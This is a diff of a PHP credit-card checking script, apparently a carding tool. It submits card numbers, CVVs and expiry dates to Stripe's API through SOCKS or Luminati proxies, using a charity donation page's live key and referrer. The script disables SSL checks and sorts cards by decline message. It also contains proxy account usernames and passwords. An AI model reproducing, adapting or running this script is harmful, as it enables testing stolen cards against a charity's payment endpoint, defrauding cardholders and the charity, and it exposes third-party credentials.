@@ -57,45 +57,37 @@ $postcode = $matches1[1][0];
 
 ////////////////////////////===[Luminati Details]
 
-$username = 'lum-customer-hl_29ca7643-zone-static';
-$password = 'swh8ippf9vvk';
-$port = 22225;
-$session = mt_rand();
-$super_proxy = 'zproxy.lum-superproxy.io';
+///$username = 'lum-customer-hl_d204d78e-zone-static';
+///$password = '@ftab3112';
+///$port = 22225;
+//$session = mt_rand();
+//$super_proxy = 'zproxy.lum-superproxy.io';
 
 ////////////////////////////===[For Authorizing Cards]
 
 $ch = curl_init();
-//////////======= LUMINATI
-////curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-////curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//////////======= Socks Proxy
+/////////========Luminati
+///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+////////=========Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
-curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: application/json',
-'Accept-encoding: gzip, deflate, br',
+'accept: application/json', 
 'Content-Type: application/x-www-form-urlencoded',
 'Origin: https://js.stripe.com',
-'referer: https://js.stripe.com/v3/controller-6cf7a4aa9b4e877012ef2577f3c5327f.html',
+'referer:  https://js.stripe.com/v3/controller-6cf7a4aa9b4e877012ef2577f3c5327f.html',
 'Sec-Fetch-Mode: cors',
 'Sec-Fetch-Site: same-site'));
-//'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'));
+//'user-agent: #'));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-
-///////////////////////=============Sort Codes
-
-// | '.$cc.' | '.$mm.' | '.$yy.' | '.$cvv.' | '.$firstname.' | '.$email.'
-
-// | '.$lastname.' | '.$Street.' | '.$city.' | '.$State.' | '.$Zip.'
-
-///////////////////////=============
-
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=787c7ab2-8275-4a03-95c7-4874523120ac&sid=48b39956-61de-46a2-81fa-9bf01d1e69fa&pasted_fields=number&payment_user_agent=stripe.js%2Fce297a58%3B+stripe-js-v3%2Fce297a58&time_on_page=87117&referrer=https%3A%2F%2Fgive.salvationarmyusa.org%2Fgive%2F164006%2F&key=pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz');
 
 $result = curl_exec($ch);
@@ -198,7 +190,7 @@ elseif (strpos($result,'Your card does not support this type of purchase.')) {
 curl_close($ch);
 ob_flush();
 //////=========Comment Echo $result If U Want To Hide Site Side Response
-///echo $result 
+//echo $result 
 
-///////////////////////////////////////////////===========================Edited by Reboot13================================================\\\\\\\\\\\\\\\
+///////////////////////////////////////////////==========================Edited by Rebot13=================================================\\\\\\\\\\\\\\\
 ?>
